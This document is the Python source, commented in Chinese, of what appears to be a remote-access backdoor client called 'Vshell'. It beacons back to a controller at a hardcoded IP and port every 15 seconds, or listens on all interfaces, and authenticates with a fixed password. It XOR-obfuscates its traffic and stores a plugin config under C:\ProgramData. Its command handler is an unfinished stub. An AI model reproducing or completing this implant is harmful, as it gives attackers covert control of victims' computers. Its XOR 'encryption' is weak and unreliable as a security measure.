#!/usr/bin/env python3
# -*- coding: utf-8 -*-
 
# 导入socket库:
import socket
import time
import os
import subprocess
import xml.dom.minidom as minidom

# 变量定义 ACTIVE 是否主动连接控制端 / SYS 被控端系统类型
ACTIVE = 1
IP = '127.0.0.1'
PORT = 9481
PASS = 'AC131'
SYS =  None

#文字颜色
# 红色 \033[0;31;48m[!]\033[0m
# 绿色 \033[0;32;48m[+]\033[0m
# 黄色 \033[0;33;48m[-]\033[0m

# 主动连接控制端
def Active():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if s.connect_ex((IP, PORT)) != 0:
            s.close()
            time.sleep(15)
        elif PassCheck(s):
            return s
        else:
            s.close()
            time.sleep(15)

# 等待控制端连接
def Passive():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',PORT))
    s.listen(1)
    while True:
        sock, addr = s.accept()
        if PassCheck(sock):
            return sock
            
# 验证
def PassCheck(sock):
    while True:
        cmd = sock.recv(1024)
        if cmd.decode('utf-8') == 'Vshell P%s' %PASS:
            sock.send(b'A')
            return True
        else:
            sock.send(b'Z')
            return False

# 加密并发送数据（发送时候分数据主体和结束符End，中间睡0.1是为了分包,主控端需要单独的一个包判断发送结束，我也不知道为啥不睡就会导致两句代码发送一个包，明明之前就ok，心态炸了）
def Send(data,sock):
    ml = len(data)					  #分别得到密钥和明文的长度
    kl = len(PASS)
    key = ml//kl*PASS+PASS[:ml%kl]		  #将密钥复制衔接，使其长度与明文长度一致
    pwd = []
    for i in range(len(key)):
	    pwd.append(chr(ord(key[i])^ord(data[i]))) #一对一异或操作，得到结果,其中,"ord(char)"得到该字符对应的ASCII码,"chr(int)"相反
    data = ''.join(pwd)
    data = data.encode('utf-8')
    sock.send(data)
    time.sleep(0.1)
    sock.send(b'End')

# 接受数据并解密（大数据按照1024字节分段传输）
def Receive(sock):
    buffer = []
    while True:
        d = sock.recv(1024)
        if d != b'End':
            buffer.append(d)
        else:
            break
    data = b''.join(buffer)
    data = data.decode('utf-8')
    # 密文解密部分，操作与加密完全一致
    ml = len(data)
    kl = len(PASS)
    key = ml//kl*PASS+PASS[:ml%kl]
    res = []
    for i in range(len(key)):
	    res.append(chr(ord(key[i])^ord(data[i]))) #一对一异或操作，得到结果,其中,"ord(char)"得到该字符对应的ASCII码,"chr(int)"相反
    data = ''.join(res)
    return data

# 插件初始化
def init(sock):
    res = subprocess.getoutput('dir C:\ProgramData | find "vsconfig"')
    if len(res) == 0:
        dom = minidom.getDOMImplementation().createDocument(None,'conf',None)
        conf = dom.documentElement
        with open('C:\\ProgramData\\vsconfig', 'w', encoding='utf-8') as f:
            dom.writexml(f, addindent='\t', newl='\n',encoding='utf-8')
    else:
        dom = minidom.parse('C:\\ProgramData\\vsconfig')
        conf = dom.documentElement
    plu_list = conf.getElementsByTagName('plugin')
    data = ''
    for item in plu_list:
        data = '[' + item.getAttribute('order') + ']' + item.getAttribute('function')
        if item.hasAttribute('Array'):
            data = data + '||' + item.getAttribute('Array')
        data = data + '\n'
    Send(data, sock)
    return dom, conf

# 插件管理
def Plugin(dom, conf, command):
    plu_list = conf.getElementsByTagName('plugin')
    for item in plu_list:
        print("dd")


# 主程序
if ACTIVE == 0:
    s = Passive()
else:
    s = Active()
#系统判断的核心，只能判断win/linux，并且判断不出MacOS，后面命令都是按Linux写的，所以不支持Macos
SYS = os.name
dom, conf = init(s)
#循环接受命令，一级指令为数字，二级为*（一级）x*（二级）
while True:
    d = Receive(s)
    if d.startswith('0'):
        Send('Bye', s)
        break
    else:
        Plugin(dom, conf, d)
s.close()